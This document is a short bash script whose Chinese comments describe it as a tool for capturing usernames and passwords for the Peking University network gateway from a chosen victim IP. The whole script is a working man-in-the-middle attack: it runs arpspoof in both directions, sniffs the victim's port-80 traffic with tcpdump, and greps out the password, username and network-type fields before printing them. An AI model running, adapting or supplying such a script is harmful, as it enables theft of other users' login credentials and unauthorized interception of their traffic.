#! /bin/bash
# 作用: 对指定ip的北大网关进行用户名密码截获
# 参数: sudo itshttp.sh [interface] [dst_ip] [route_ip]
# 输出: [username] [password] [net type]

if [ $# -ne 3 ]; then
	exit 1;
fi

# 命名管道: 作用是将tcpdump的输出重定向为本脚本的输入
fifo=`mktemp --suffix=.fifo -u -p ./`;
mkfifo $fifo;
# arpspoof用于arp欺骗
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
tcpdump -Xvv -i $1 -s 0 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &

# 通过命名管道将命令输出和脚本输入连接
exec 0< $fifo;
# 从tcpdump的输出中每次处理一行, 截获its用户名密码
while read line; do
	password=`echo $line | grep -a -oP "(?<=password=)[0-9a-zA-Z]+"`
	if [ -n "$password" ]; then
		username1=`echo $line | grep -a -oP "(?<=username1=)[0-9]+"`;
		fwrd=`echo $line | grep -a -oP "(?<=fwrd=)[0-9a-zA-Z]+"`;
		if [ -n "$username1" ] && [ -n "$fwrd" ]; then
			break
		fi
	fi
done

# 杀死后台进程 
jobs -pr | xargs -I {} kill -9 {} 2>/dev/null;
rm $fifo;

# 输出截取的结果
if [ -z $password ]; then
	exit 1;
else
	echo "$username1 $password $fwrd";
fi

